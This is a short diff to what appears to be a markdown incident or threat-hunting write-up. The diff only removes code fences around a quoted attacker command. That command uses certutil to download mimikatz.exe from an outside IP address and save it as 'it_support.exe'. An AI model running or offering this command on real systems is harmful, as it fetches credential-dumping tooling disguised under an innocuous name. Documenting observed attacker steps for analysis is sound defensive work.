@@ -143,9 +143,9 @@ they were actively working through options.
 
 Then they ran this command:
 
-```
+
 certutil.exe -urlcache -f http://152.44.44.246:8080/mimikatz.exe it_support.exe
-``
+
 <img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/8e8b2f1f-aff4-4489-9f04-fb2ec6d021e5" />
 
 ---
